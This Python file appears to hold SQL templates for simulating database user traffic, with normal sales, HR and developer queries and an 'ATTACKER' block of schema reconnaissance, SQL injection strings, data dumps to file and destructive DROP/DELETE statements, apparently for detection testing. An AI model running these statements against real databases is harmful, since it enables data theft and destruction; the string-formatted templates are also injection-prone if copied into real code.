# simulation_v2/sql_templates.py

SQL_TEMPLATES = {
    "SALES": {
        "LOGIN": "SELECT 1", # Keep-alive hoặc check connection
        "LOGOUT": "SELECT 'Logged out'",
        
        # Flow Khách hàng
        "SEARCH_CUSTOMER": [
            "SELECT customer_id, name, email FROM sales_db.customers WHERE city = '{city}' LIMIT 20",
            "SELECT customer_id, name FROM sales_db.customers WHERE name LIKE '{name}%'"
        ],
        "VIEW_CUSTOMER": "SELECT * FROM sales_db.customers WHERE customer_id = {customer_id}",
        "UPDATE_INFO": "UPDATE sales_db.customers SET phone = '{phone}' WHERE customer_id = {customer_id}",
        "CREATE_ORDER": "INSERT INTO sales_db.orders (customer_id, order_date, total_amount, status) VALUES ({customer_id}, NOW(), {amount}, 'Pending')",
        
        # Flow Đơn hàng
        "SEARCH_ORDER": "SELECT order_id, order_date, status FROM sales_db.orders WHERE status = '{status}' ORDER BY order_date DESC LIMIT 10",
        "VIEW_ORDER": "SELECT * FROM sales_db.order_items WHERE order_id = {order_id}",
        "UPDATE_ORDER_STATUS": "UPDATE sales_db.orders SET status = 'Processing' WHERE order_id = {order_id}",
        "ADD_ITEM": "INSERT INTO sales_db.order_items (order_id, product_id, quantity, unit_price) VALUES ({order_id}, {product_id}, {quantity}, {price})"
    },
    
    "HR": {
        "LOGIN": "SELECT 1",
        "LOGOUT": "SELECT 'Logged out'",
        
        "SEARCH_EMPLOYEE": "SELECT employee_id, name, position FROM hr_db.employees WHERE dept_id = {dept_id}",
        "VIEW_PROFILE": "SELECT * FROM hr_db.employees WHERE employee_id = {employee_id}",
        "CHECK_ATTENDANCE": "SELECT * FROM hr_db.attendance WHERE employee_id = {employee_id} ORDER BY date DESC LIMIT 30",
        
        "VIEW_PAYROLL": "SELECT sum(amount) FROM hr_db.salaries WHERE payment_date >= '{date}'",
        "UPDATE_SALARY": "UPDATE hr_db.salaries SET amount = amount + {bonus} WHERE employee_id = {employee_id} ORDER BY payment_date DESC LIMIT 1",
        "EXPORT_REPORT": "SELECT * FROM hr_db.employees e JOIN hr_db.salaries s ON e.employee_id = s.employee_id" 
    },
    
    "DEV": {
        "LOGIN": "SELECT @@version",
        "LOGOUT": "SELECT 'Goodbye'",
        "DEBUG_QUERY": [
            "SELECT * FROM sales_db.orders WHERE order_id = {order_id}",
            "EXPLAIN SELECT * FROM sales_db.order_items JOIN sales_db.products ON order_items.product_id = products.id WHERE order_id = {order_id}"
        ],
        "EXPLAIN_QUERY": "EXPLAIN SELECT * FROM sales_db.customers WHERE email LIKE '%@gmail.com'",
        "CHECK_LOGS": "SHOW FULL PROCESSLIST"
    }
}

SQL_TEMPLATES["ATTACKER"] = {
    "LOGIN": "SELECT user()", # Recon
    "LOGOUT": "SELECT 'Connection closed'",
    
    # RECONNAISSANCE (Thăm dò)
    "RECON_SCHEMA": [
        "SELECT table_name FROM information_schema.tables WHERE table_schema='sales_db'",
        "SELECT column_name FROM information_schema.columns WHERE table_name='customers'",
        "SHOW GRANTS FOR CURRENT_USER"
    ],
    
    # SQL INJECTION (Tiêm mã độc)
    "SQLI_CLASSIC": [
        "SELECT * FROM sales_db.customers WHERE name = 'admin' OR '1'='1'",
        "SELECT * FROM sales_db.products WHERE id = 1 UNION SELECT 1, user(), 3, 4 -- "
    ],
    "SQLI_BLIND": [
        "SELECT * FROM sales_db.products WHERE id = 1 AND SLEEP(2)",
        "SELECT BENCHMARK(1000000,MD5(1))"
    ],

    # DATA EXFILTRATION (Lấy trộm dữ liệu)
    "DUMP_DATA": [
        "SELECT * FROM hr_db.salaries",  # Lấy bảng nhạy cảm
        "SELECT * FROM sales_db.customers INTO OUTFILE '/tmp/hack_{random_id}.csv'"
    ],

    # DESTRUCTIVE (Phá hoại)
    "DROP_TABLE": "DROP TABLE IF EXISTS sales_db.temp_orders", # Demo thôi, đừng drop bảng thật khi test
    "MASS_DELETE": "DELETE FROM sales_db.order_items WHERE quantity > 0"
}